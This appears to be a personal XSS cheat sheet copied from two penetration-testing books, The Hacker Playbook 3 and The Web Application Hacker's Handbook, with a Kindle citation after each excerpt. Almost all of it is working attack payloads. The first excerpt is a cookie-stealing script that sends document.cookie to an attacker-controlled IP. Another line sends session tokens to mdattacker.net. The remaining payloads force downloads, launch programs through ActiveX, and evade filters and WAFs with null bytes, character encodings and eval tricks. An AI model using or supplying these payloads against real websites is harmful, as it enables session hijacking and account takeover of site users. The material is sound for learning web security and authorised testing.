
Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 54). Secure Planet. Kindle Edition.

Cookie Stealing XSS: 
<script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
Forcing the Download of a File: 
<script>var link = document.createElement('a'); link.href = 
       'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = '';
        document.body.appendChild(link); link.click();</script>
Redirecting User: 
<script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
Other Scripts to Enable Key Loggers, Take Pictures, and More  
http://www.xss-payloads.com/payloads-list.html?c#category=capture

Event Attributes that execute JavaScript being outside a <script> tag: 
  <b onmouseover=alert('XSS')>Click Me!</b>  
  <svg onload=alert(1)>  <body onload="alert('XSS')">  
  <img src="http://test.cyberspacekittens.com" 
  onerror=alert(document.cookie);>

Kim, Peter. The Hacker Playbook 3: Practical Guide To Penetration Testing (p. 54). Secure Planet. Kindle Edition. 



var i=new Image; i.src="http://mdattacker.net/"+document.cookie;
 This code causes the user's browser to make a request to mdattacker.net which is a domain owned by the attacker. 
 The request contains the user's current session token for the application:
  GET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1
  Host: mdattacker.net
 7. The attacker monitors requests to mdattacker.net and receives the user's request. 
 He uses the captured token to hijack the user's session, gaining access to that user's personal information and 
 performing arbitrary actions “as” the user.

Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11652-11656). Wiley. Kindle Edition. 

Launch Calc
<script>
    var o = new ActiveXObject('WScript.shell');
    o.Run('calc.exe');
</script>

Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11881-11882). Wiley. Kindle Edition. 

"><script>alert(document.cookie)</script>

Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 11992-11993). Wiley. Kindle Edition. 

"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00"><script>alert(document.cookie)</script>

Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12014-12017). Wiley. Kindle Edition. 

<input type="text" name="address1" value="myxsstestdmqlwp">
"><script>alert(1)</script>
" onfocus="alert(1)

Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12090). Wiley. Kindle Edition. 

<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>
'; alert(1); var foo='
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12094-12095). Wiley. Kindle Edition. 

<a href="myxsstestdmqlwp">Click here ...</a>
javascript:alert(1);
#"onclick="javascript:alert(1)
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12120). Wiley. Kindle Edition. 

Base64
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
Click here</a>
 The Base64-encoded string in the preceding examples is: <script>alert(1)</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12184-12189). Wiley. Kindle Edition. 

No user Interaction
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12194-12199). Wiley. Kindle Edition. 

HTML 5 No user interaction 
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12203-12204). Wiley. Kindle Edition. 

Closing Tags
</a onmousemove=alert(1)>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12207). Wiley. Kindle Edition. 

Finally, HTML5 introduces new tags with event handlers: <video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12209-12211). Wiley. Kindle Edition.

Script pseudo-protocols can be used in various locations to execute inline script within an attribute that expects a URL. 
Here are some examples: 
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12213-12216). Wiley. Kindle Edition. 

<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12223). Wiley. Kindle Edition. 


dynamically evaluated CSS styles. The following example works on IE7 and earlier, and also on later versions when running
in compatibility mode: <x style=x:expression(alert(1))>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12229-12231). Wiley. Kindle Edition. 


IE Only - Later Versions
<x style=behavior:url(#default#time2) onbegin=alert(1)>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12235-12236). Wiley. Kindle Edition. 

you can insert NULL bytes at any position: <[%00]img onerror=alert(1) src=a>
<i[%00]mg onerror=alert(1) src=a>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12261-12263). Wiley. Kindle Edition. 
Using NULL bytes has historically proven effective against web application firewalls (WAFs) configured to block 
requests containing known attack strings. Because WAFs typically are written in native code for performance reasons, 
a NULL byte terminates the string in which it appears. This prevents the WAF from seeing the malicious payload that 
comes after the NULL
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12273-12275). Wiley. Kindle Edition. 


Several characters can replace the space between the tag name and the first attribute name: 
<img/onerror=alert(1) src=a>
<img[%09]onerror=alert(1) src=a>
<img[%0d]onerror=alert(1) src=a>
<img[%0a]onerror=alert(1) src=a>
<img/"onerror=alert(1) src=a>
<img/'onerror=alert(1) src=a>
<img/anyjunk/onerror=alert(1) src=a>
 Note that even where an attack does not require any tag attributes, you should always try adding some superfluous 
 content after the tag name, because this bypasses some simple filters: 
 <script/anyjunk>alert(1)</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12296-12305). Wiley. Kindle Edition. 


Within the attribute name, you can use the same NULL byte trick described earlier. This bypasses many simple 
filters that try to block event handlers by blocking attribute names starting with on: 
<img o[%00]nerror=alert(1) src=a>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12307-12310). Wiley. Kindle Edition. 

HTML Encode
HTML-encode characters within the value: <img onerror=a[%00]lert(1) src=a>
<img onerror=a&#x6c;ert(1) src=a>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12336-12338). Wiley. Kindle Edition. 

<img onerror=a&#x06c;ert(1) src=a>
<img onerror=a&#x006c;ert(1) src=a>
<img onerror=a&#x0006c;ert(1) src=a>
<img onerror=a&#108;ert(1) src=a>
<img onerror=a&#0108;ert(1) src=a>
<img onerror=a&#108ert(1) src=a>
<img onerror=a&#0108ert(1) src=a>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12348-12350). Wiley. Kindle Edition. 

 %253cimg%20onerror=alert(1)%20src=a%253e
 is URL-decoded by the application server and passed to the application as:
 %3cimg onerror=alert(1) src=a%3e
 The application decodes as:
 <img onerror=alert(1) src=a>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12364). Wiley. Kindle Edition. 

<<script>alert(1);//<</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12380). Wiley. Kindle Edition. 


Works on Firefox - ECMAScript for XML
<script<{alert(1)}/></script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Location 12385). Wiley. Kindle Edition. 

Character Set Encoding
representations of the string <script>alert(document.cookie)</script> in alternative character sets: 
UTF-7
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
US-ASCII 
 BC 73 63 72 69 70 74 BE 61 6C 65 72 74 28 64 6F ; ¼script¾alert(do
63 75 6D 65 6E 74 2E 63 6F 6F 6B 69 65 29 BC 2F ; cument.cookie)¼/
73 63 72 69 70 74 BE                            ; script¾
UTF-16 
 FF FE 3C 00 73 00 63 00 72 00 69 00 70 00 74 00 ; ÿþ<.s.c.r.i.p.t.
3E 00 61 00 6C 00 65 00 72 00 74 00 28 00 64 00 ; >.a.l.e.r.t.(.d.
6F 00 63 00 75 00 6D 00 65 00 6E 00 74 00 2E 00 ; o.c.u.m.e.n.t...
63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12400-12409). Wiley. Kindle Edition. 

Unicode escapes can be used to represent characters within JavaScript keywords, allowing you to bypass many 
kinds of filters: 
<script>a\u006cert(1);</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12449-12451). Wiley. Kindle Edition. 

Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes: <script>eval('a\u006cert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
 Furthermore, superfluous escape characters within strings are ignored: <script>eval('a\l\ert\(1\)');</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12456-12464). Wiley. Kindle Edition. 

Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes: 
<script>eval('a\u006cert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
 Furthermore, superfluous escape characters within strings are ignored: <script>eval('a\l\ert\(1\)');</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12456-12464). Wiley. Kindle Edition.

Dynamically Constructing Strings You can use other techniques to dynamically construct strings to use in your attacks:
<script>eval(‘al’+‘ert(1)’);</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
<script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12465-12470). Wiley. Kindle Edition. 

Alternatives to eval If direct calls to the eval command are not possible, you have other ways to execute commands in 
string form: <script>'alert(1)'.replace(/.+/,eval)</script>
<script>function::[‘alert’](1)</script>
 Alternatives to Dots If the dot character is being blocked, you can use other methods to perform dereferences: 
 <script>alert(document[‘cookie’])</script>
<script>with(document)alert(cookie)</script>
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12473-12482). Wiley. Kindle Edition. 

In the following example, the “e” character in “alert” has been escaped using Unicode escaping, and the backslash 
used in the Unicode escape
has been HTML-encoded: <img onerror=eval('al&#x5c;u0065rt(1)') src=a>
 Of course, any of the other characters within the onerror attribute value could also be HTML-encoded to further hide 
 the attack: <img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
 This technique enables you to bypass many filters on JavaScript code, because you can avoid using any JavaScript
 keywords or other syntax such as quotes, periods, and brackets.
Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12489-12499). Wiley. Kindle Edition. 

